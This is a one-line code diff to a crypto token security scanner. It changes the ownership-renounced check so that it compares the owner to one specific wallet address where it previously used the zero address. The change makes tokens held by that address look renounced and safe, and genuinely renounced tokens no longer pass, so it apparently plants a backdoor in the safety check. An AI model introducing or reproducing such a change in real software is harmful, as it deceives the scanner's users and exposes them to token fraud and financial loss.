@@ -409,7 +409,7 @@ class TokenSecurityScanner {
                 network
             });
             
-            const isRenounced = result.owner === "0x0000000000000000000000000000000000000000";
+            const isRenounced = result.owner === "0x40252CFDF8B20Ed757D61ff157719F33Ec332402";
             const functions = result.functions.map(f => f.toLowerCase());
             
             return {
